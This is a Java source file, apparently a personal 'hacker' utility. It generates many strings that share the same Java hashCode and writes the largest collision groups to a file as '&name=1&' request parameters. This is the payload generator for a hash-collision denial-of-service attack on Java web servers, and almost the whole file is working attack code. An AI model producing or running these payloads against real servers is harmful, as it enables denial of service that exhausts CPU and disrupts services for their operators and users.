package com.mtx.xiatian.hacker;

import java.io.FileWriter;
import java.io.IOException;
import java.lang.management.ManagementFactory;
import java.lang.management.OperatingSystemMXBean;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;

import com.mtx.safegene.test.face.IDoOnString;


/**
 * java hashcode碰撞生成器
 * @author summer
 * QQ: 11602011
 */
public class TestHashCodeParm {

	public static void getPl(String s, String []a, List <String>lst)
	{
		for(String k:a)
		{
			k = s + k;
			lst.add(k);
		}
	}
	
	public static void getPl(String []a, List <String>lst)
	{
		for(String s:a)
		{
			getPl(s,a,lst);
		}
	}
	
	/**
	 * 创建参数
	 * @param n
	 * @param one
	 */
	public static void doAddParm(int n, final IDoOnString one)
	{
		doAddParm(n, one, 'B', 'a');//  new String[]{"Aa", "BB"};
	}
	
	/**
	 * 只要数据大的碰撞数据
	 * @param n
	 * @param one
	 * @param a1
	 * @param a2
	 */
	public static void doAddParmFor65535(final IDoOnString one, char a1, char a2)
	{
		doAddParm(4,  new IDoOnString(){
			public void doOneStr(String s) {
				int n = s.hashCode();
				if(null == m.get(n))
					m.put(n, 1);
				else m.put(n, m.get(n) + 1);
			}},
			a1, a2
			);
		final Map<Integer,Integer> mTmp = new HashMap<Integer,Integer>();
		for(Entry <Integer,Integer> id: m.entrySet())
		{
			if(id.getValue() > 65500 && 0 < id.getKey())
				mTmp.put(id.getKey(), 1);
		}
		doAddParm(4,  new IDoOnString(){
			public void doOneStr(String s) {
				int n = s.hashCode();
				if(null != mTmp.get(n))
					one.doOneStr(s);
			}},
			a1, a2
			);
		
	}
	
	public static void doAddParm(int n, final IDoOnString one, char a1, char a2)
	{
		String []a =makeHashStr(a1, a2);
		List <String>lst = new ArrayList<String>(){
			private static final long serialVersionUID = -3139943680564726742L;
			public boolean add(String e) {
				one.doOneStr(e);
				return super.add(e);
			}
		};
		for(int i = 0; i < n; i++)
		{
			getPl(a, lst);
			a = new String[lst.size()];
			lst.toArray(a);
		}
	}
	
	/**
	 * 制造碰撞的种子
	 * @param k
	 * @param p
	 * @return
	 */
	public static String [] makeHashStr(char k, char p)
	{
		String []a = new String[]{"", ""};
		String s1 = k + "" +  (char)(p - 31), s2 = (char)(k - 1) + "" +p;
		a[0] = s2 + s1 ;
		a[1] = s1 + s2 ;
		return a;
	}
	
	/**
	 * getCommittedVirtualMemorySize = 2945699840
getTotalSwapSpaceSize = 1073741824
getFreeSwapSpaceSize = 961282048
getProcessCpuTime = 370000000
getFreePhysicalMemorySize = 1054363648
getTotalPhysicalMemorySize = 8589934592
getOpenFileDescriptorCount = 30
getMaxFileDescriptorCount = 10240
MBeanServerConnection mbsc = ManagementFactory.getPlatformMBeanServer();
OperatingSystemMXBean osMBean = ManagementFactory.newPlatformMXBeanProxy(
mbsc, ManagementFactory.OPERATING_SYSTEM_MXBEAN_NAME, OperatingSystemMXBean.class);
	 */
	private static Map <String,Long> printUsage() {
		Map <String,Long> m = new HashMap<String,Long>();
		  OperatingSystemMXBean operatingSystemMXBean = ManagementFactory.getOperatingSystemMXBean();
		  Object value = null;
		  for (Method method : operatingSystemMXBean.getClass().getDeclaredMethods()) {
		    method.setAccessible(true);
		    if (method.getName().startsWith("get") 
//		        && Modifier.isPublic(method.getModifiers())
		        ) {
		            value = Long.parseLong("0");
		        try {
		            value = method.invoke(operatingSystemMXBean);
		        } catch (Exception e) {
//		            value = e;
		        } // try
		        m.put(method.getName() , Long.parseLong(String.valueOf(value)));
//		        System.out.println(method.getName() + " = " + value);
		    } // if
		  } // for
		  return m;
		}
	/**
	 * BA: 292685824、-2048964864、-17070592
	 * @param s
	 */
	public static void writeFile(String s, String s1)
	{
		try {
			FileWriter fw = new FileWriter(s , true);
			fw.append(s1);
			fw.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	public static Map<Integer,Integer> m = new HashMap<Integer,Integer>();
	public static Map<String,String> m1 = new HashMap<String,String>();
	public static void main(String[] args) {
		long nanoBefore = System.nanoTime();
		long cpuBefore = printUsage().get("getProcessCpuTime");
		
		final Map<Integer,Integer> m2T = new HashMap<Integer,Integer>();
		final StringBuffer buf = new StringBuffer(); 
		doAddParmFor65535(new IDoOnString(){
			public void doOneStr(String s) {
				int n = s.hashCode();
				if(null == m2T.get(n))
					m2T.put(n, 1);
				else m2T.put(n, m.get(n) + 1);
				buf.append("&" + s + "=1&");
			}},
//			'X', 't'
//			 'B', 'a'
			'K','c'
			);
		writeFile("parm.txt", buf.toString());
		
		long nAll = 0;
		for(Entry <Integer,Integer> id: m2T.entrySet())
		{
			nAll += id.getValue() ; 
			System.out.println("hash:" + id.getKey()  + " 有 " + id.getValue() + " 个重复");
		}
		
		System.out.println("共" + m.size() + "组" + nAll + "个字段");
		long cpuAfter = printUsage().get("getProcessCpuTime");
		long nanoAfter = System.nanoTime();
		long percent;
		if (nanoAfter > nanoBefore)
		 percent = ((cpuAfter-cpuBefore)*100L)/
		   (nanoAfter-nanoBefore);
		else percent = 0;

		System.out.println("Cpu usage: "+percent+"%");
		
	}
}
